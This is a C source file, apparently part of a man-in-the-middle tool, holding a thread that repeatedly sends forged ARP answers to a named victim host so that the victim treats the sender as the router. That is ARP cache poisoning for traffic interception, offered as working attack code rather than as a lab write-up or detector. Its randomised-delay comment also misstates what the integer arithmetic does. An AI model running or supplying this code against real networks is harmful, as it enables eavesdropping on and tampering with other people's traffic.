#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <unistd.h>

#ifdef DNET_NAME
#include DNET_NAME
#else
#include <dnet.h> // to interprete the captures
#endif

#include "witm.h"

extern pcap_t *handle;
extern eth_addr_t my_mac_addr;
extern eth_addr_t router_mac_addr;
extern eth_addr_t victim_mac_addr;
extern ip_addr_t router_ip_addr;
extern ip_addr_t my_ip_addr;
extern ip_addr_t victim_ip_addr;

void * poisoning_thread(void * v __attribute__((unused))) {
	srand(time(NULL)); // initializes PRNG seed
	uint32_t victim_ip_addr2 = htonl(victim_ip_addr);
	uint32_t router_ip_addr2 = htonl(router_ip_addr);

	while (42)
	{
		arp_answer(victim_mac_addr, (uint8_t *)&victim_ip_addr2, (uint8_t *)&router_ip_addr2);
//		arp_request(victim_mac_addr.eth_src, my_mac_addr, my_mac_addr, ntohl(router_ip_addr), null_addr, *(uint32_t *)arp_payload.ar_spa);

		sleep( (rand() / RAND_MAX)*4 + 1 ); // beween 1 and 5 seconds

	}

	return (void *)NULL;
}

